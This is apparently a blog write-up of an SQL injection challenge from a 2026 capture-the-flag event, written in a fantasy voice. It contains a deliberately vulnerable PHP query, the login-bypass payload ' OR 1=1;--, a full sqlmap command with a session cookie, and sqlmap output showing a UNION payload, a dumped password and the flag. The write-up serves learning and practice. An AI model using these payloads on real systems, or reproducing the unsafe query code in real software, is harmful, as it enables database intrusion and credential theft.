---
layout: post
title: SQLi Challenge Writeup
subtitle: ISSessions 2026 Fantasy CTF
thumbnail-img: /assets/img/issessions26-shop.png
share-img: /assets/img/issessions26-shop.png
image: /assets/img/issessionsfantasyctf26.jpg
tags: [ctf, writeup, sql injection]
author: Tina Ismail
---
<style>
    body{
        background-image:url(../assets/img/scroll.png);
    }
    p {
        font-family: "Trebuchet MS", serif;
        font-weight:bold;
    }
    .b3{
        font-family: Harrington, Papyrus;
        background-color:#436436;
        border-radius:20px;
        text-align:center;
        padding:1%;
        color:white;
        box-shadow: 0 0 10px #436436, 0 0 20px #436436;
        margin-top:30px;
        font-weight:bold;
    }
    *{
        color:#141210;
    }
    pre, code{
        color:white;
        background-color:black;
    }
    img{
        margin:auto;
    }
</style>
Greetings weary travellers! Settle down as I tell you my tale of epic intrigue. Few will believe my exploits but I swear it to be true. Here you will learn of my forbidden methods.

We enter this portal of dubious origin. The description specifically mentions the username slime001, and the target URL has the string sql-injection. This leads me to believe that there is a sql injection vulnerability in the login form. 

![The Lost Scroll Challenge Discription](/assets/img/issessions26-sqli-desc.png)

<h2 class="b3">The Magic of SQL Injections</h2>

<a class="image" href="https://xkcd.com/327/">![Exploits of a Mom](https://imgs.xkcd.com/comics/exploits_of_a_mom.png)</a>

Databases are essential to crafting any meaninful web application. Just think about your favourite social media website that has to summon all kinds of information about its users or uploaded content. If you're a library enjoyer like I am, have you ever wondered how your library's catalogue just *knows* what books are available, at which libraries you may find them, and for what ages they're meant? This functionality is made possible through the use of relational databases, a sort of organized store of data stuctured in tables.

SQL is the glue that binds it all together, and it stands for Structured Query Language. It is a special language used to interact with relational databases to obtain specific information. This technique is especially useful against web applications that do not validate user input before sending it to the backend, giving malicious actors a direct pathway to the database if they know what SQL commands to inject as input. Priviledge escalation can also be performed through this technique.<br>

Below is a standard SQL query within a php script. The query is `"SELECT * FROM users WHERE username='$username'"` where username is a field populated by user input.

```
<?php
    $username = $_GET['username'];
    $result = mysql_query("SELECT * FROM users WHERE username='$username'");
?>
```
Suppose I were to input the username `att4ni`. Then the query would look like: `"SELECT * FROM users WHERE username='att4ni'"` and the result would give me every entry from the database users where att4ni is the username. Makes sense!<br>
Now what if I were a hacker and I wanted to retrieve all the data for every user in the users database? 

<h2 class="b3">Vulnerable Login AKA Alohomora</h2>
With this in mind, we set the username field to slime001, and attempt a sql injection on the password field. This took me quite a while if I'm honest, since I was attempting more complicated injection methods using sqlmap. I'm glad I read up on this tool, because although it did not aid me in this part of the challenge, it came in handy for the following part. At the end, the enchantment that did the trick was `' OR 1=1;--`. After hitting the Submit Query button, we're off to part 2 of the challenge.<br>

![Login Page](/assets/img/issessions26-sqli.png)

<h2 class="b3">Mythical Shop AKA Show Me Your Wares</h2>

![Slime001's Mythical Shop](/assets/img/issessions26-sqli-shop.png)

```
sqlmap -u "https://issessionsctf-sql-injection-challenge.chals.io/items/?search=1%3D%3D1" --cookie="session=eyJ1c2VyX2lkIjoxfQ.aZtS0w.ROwLPykA6ybPz7_UPr5jePYct6o" -p search -T items -a --batch
```

The output of this command is a long one, but if you bear with it it tells you all you need, including the true password for our user slime001.

```
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.11#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:27:33 /2026-02-22/

[14:27:34] [INFO] resuming back-end DBMS 'sqlite' 
[14:27:34] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: search=1==1' UNION ALL SELECT NULL,CONCAT(CONCAT('qvbqq','yCpDpAgbxuonsptNRjDKbHWXWLPIHlztpasPzCxX'),'qkvkq'),NULL,NULL,NULL,NULL-- JdIc
---
[14:27:35] [INFO] the back-end DBMS is SQLite
[14:27:35] [INFO] fetching banner
back-end DBMS: SQLite
banner: '3.46.1'
[14:27:35] [WARNING] on SQLite it is not possible to enumerate the current user
[14:27:35] [WARNING] on SQLite it is not possible to get name of the current database
[14:27:35] [WARNING] on SQLite it is not possible to enumerate the hostname
[14:27:35] [WARNING] on SQLite the current user has all privileges
current user is DBA: True
[14:27:35] [WARNING] on SQLite it is not possible to enumerate the users
[14:27:35] [WARNING] on SQLite it is not possible to enumerate the user password hashes
[14:27:35] [WARNING] on SQLite it is not possible to enumerate the user privileges
[14:27:35] [WARNING] on SQLite the concept of roles does not exist. sqlmap will enumerate privileges instead
[14:27:35] [WARNING] on SQLite it is not possible to enumerate the user privileges
[14:27:35] [INFO] sqlmap will dump entries of all tables from all databases now
[14:27:35] [INFO] fetching tables for database: 'SQLite_masterdb'
[14:27:35] [INFO] fetching columns for table 'sqlite_sequence' 
[14:27:35] [INFO] fetching entries for table 'sqlite_sequence'
Database: <current>
Table: sqlite_sequence
[2 entries]
+-----+-------+
| seq | name  |
+-----+-------+
| 4   | items |
| 1   | USERS |
+-----+-------+

[14:27:35] [INFO] table 'SQLite_masterdb.sqlite_sequence' dumped to CSV file '/home/att4ni/.local/share/sqlmap/output/issessionsctf-sql-injection-challenge.chals.io/dump/SQLite_masterdb/sqlite_sequence.csv'
[14:27:35] [INFO] fetching columns for table 'USERS' 
[14:27:35] [INFO] fetching entries for table 'USERS'
Database: <current>
Table: USERS
[1 entry]
+----+------------------------------------------------------------------+----------+
| id | password                                                         | username |
+----+------------------------------------------------------------------+----------+
| 1  | puasfpuinbinoraenpueanrp982y5023497239pupng9h))&$#)&$&#Yniqugn4i | slime001 |
+----+------------------------------------------------------------------+----------+

[14:27:35] [INFO] table 'SQLite_masterdb.USERS' dumped to CSV file '/home/att4ni/.local/share/sqlmap/output/issessionsctf-sql-injection-challenge.chals.io/dump/SQLite_masterdb/USERS.csv'
[14:27:35] [INFO] fetching columns for table 'items' 
[14:27:35] [INFO] fetching entries for table 'items'
Database: <current>
Table: items
[4 entries]
+----+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------------+--------------------------+-------+--------+
| id | info                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | name             | image                    | price | hidden |
+----+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------------+--------------------------+-------+--------+
| 1  | A legendary weapon forged through magic or ancient ritual, its blade constantly engulfed in living fire. The flames do not consume the wielder but instead respond to their will, intensifying with emotion or combat prowess. Each strike scorches armor and flesh alike, leaving burning wounds and radiant trails of heat in the air. Often tied to elemental fire spirits, dragons, or lost civilizations, the sword is both a symbol of destructive power and a test of mastery, rewarding only those strong enough to control its blazing fury.                                                                                                                                                                                       | Sword of Flames  | images/red sword.png     | 1000  | 0      |
| 2  | A modestly enchanted blade shaped by natural forces rather than raw elemental power. Its magic is subtle, allowing the sword to remain sharp, resilient, and slightly enhanced by the vitality of the land it comes from. Vines, bark-like patterns, or faint green hues may trace the blade, and its strikes can cause minor effects such as accelerated decay of armor or brief rooting of enemies. Favored by rangers and travelers, the sword is practical and dependable, valued more for its steady usefulness and connection to the natural world than for overwhelming strength or spectacle.                                                                                                                                       | Sword of Nature  | images/green sword.png   | 500   | 0      |
| 3  | An ancient relic said to be penned in fire and scale by the first dragons at the dawn of magic. Its wyrm-hide parchment is etched with living runes that shift and rearrange themselves, revealing forbidden truths only to those clever—or reckless—enough to read between the lines. Legends claim the scroll does not grant power directly, but instead teaches how to bend the laws of magic, slipping commands into reality the way a rogue spell slips past a ward. Inscribed deep within its final ciphered verse lies the mark of its mastery, a phrase known to scholars and spellbreakers alike: FantasyCTF{qu3ry_th3_dr4g0n_scr0ll_0f_p0w3r}, a reminder that even the strongest systems can fall to a well-crafted incantation. | Dragon Scroll    | images/dragon scroll.png | 500   | 1      |
| 4  | A finely crafted blade imbued with the steady, relentless power of the ocean. Its magic is neither subtle nor overwhelming, manifesting in cool hues, faint mist, and a constant damp chill along the edge. The sword strikes with the weight of crashing waves, wearing down foes through persistence rather than sudden force, and its enchantment allows it to cut cleanly through armor and resist corrosion or breakage. Favored by sailors, coastal warriors, and tide-bound guardians, the sword embodies balance—strong and reliable, yet restrained—drawing its strength from the endless patience and quiet dominance of the sea.                                                                                                 | Sword of the Sea | images/blue sword.png    | 700   | 0      |
+----+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+------------------+--------------------------+-------+--------+

[14:27:36] [INFO] table 'SQLite_masterdb.items' dumped to CSV file '/home/att4ni/.local/share/sqlmap/output/issessionsctf-sql-injection-challenge.chals.io/dump/SQLite_masterdb/items.csv'
[14:27:36] [INFO] fetched data logged to text files under '/home/att4ni/.local/share/sqlmap/output/issessionsctf-sql-injection-challenge.chals.io'

[*] ending @ 14:27:36 /2026-02-22/
```
It's a bit hard to make sense of in the above SQLMAP output snippet, so here is the table items in the current database named `SQLite_masterdb`. Look closely for the flag. Did you catch it?<br>

| id | info | name | image | price | hidden |
|----|------|------|-------|-------|--------|
| 1 | A legendary weapon forged through magic or ancient ritual, its blade constantly engulfed in living fire. The flames do not consume the wielder but instead respond to their will, intensifying with emotion or combat prowess. Each strike scorches armor and flesh alike, leaving burning wounds and radiant trails of heat in the air. Often tied to elemental fire spirits, dragons, or lost civilizations, the sword is both a symbol of destructive power and a test of mastery, rewarding only those strong enough to control its blazing fury. | Sword of Flames | images/red sword.png | 1000 | 0 |
| 2 | A modestly enchanted blade shaped by natural forces rather than raw elemental power. Its magic is subtle, allowing the sword to remain sharp, resilient, and slightly enhanced by the vitality of the land it comes from. Vines, bark-like patterns, or faint green hues may trace the blade, and its strikes can cause minor effects such as accelerated decay of armor or brief rooting of enemies. Favored by rangers and travelers, the sword is practical and dependable, valued more for its steady usefulness and connection to the natural world than for overwhelming strength or spectacle. | Sword of Nature | images/green sword.png | 500 | 0 |
| 3 | An ancient relic said to be penned in fire and scale by the first dragons at the dawn of magic. Its wyrm-hide parchment is etched with living runes that shift and rearrange themselves, revealing forbidden truths only to those clever—or reckless—enough to read between the lines. Legends claim the scroll does not grant power directly, but instead teaches how to bend the laws of magic, slipping commands into reality the way a rogue spell slips past a ward. Inscribed deep within its final ciphered verse lies the mark of its mastery, a phrase known to scholars and spellbreakers alike: FantasyCTF{qu3ry_th3_dr4g0n_scr0ll_0f_p0w3r}, a reminder that even the strongest systems can fall to a well-crafted incantation. | Dragon Scroll | images/dragon scroll.png | 500 | 1 |
| 4 | A finely crafted blade imbued with the steady, relentless power of the ocean. Its magic is neither subtle nor overwhelming, manifesting in cool hues, faint mist, and a constant damp chill along the edge. The sword strikes with the weight of crashing waves, wearing down foes through persistence rather than sudden force, and its enchantment allows it to cut cleanly through armor and resist corrosion or breakage. Favored by sailors, coastal warriors, and tide-bound guardians, the sword embodies balance—strong and reliable, yet restrained—drawing its strength from the endless patience and quiet dominance of the sea. | Sword of the Sea | images/blue sword.png | 700 | 0 |

<h3>
<details>
<summary>The Enchantment We Need</summary>

FantasyCTF{qu3ry_th3_dr4g0n_scr0ll_0f_p0w3r}

</details></h3>

<h2 class="b3">Special Acknowledgements</h2>

Thank you to TrendMicro and KPMG for your support this weekend! <br>

To our friends at TrendMicro, I learned a lot from your insights during the resume roast, and I shall commit to memory the errs of my fellow adventurers and merryfolk in the pursuit of employment. 

Thanks to KPMG for hosting us and opening your Toronto office up for our use - it's always a delight to take in the sights from up so high (especially on such a foggy weekend)!<br>

Finally, I express my sincerest gratitude to the ISSessions Fantasy CTF team for organizing another successful CTF! Your dedication shines through, and the theme this year was most enjoyable. Please spare us the accent next time, if you please.

Cheers!<br>
Att4ni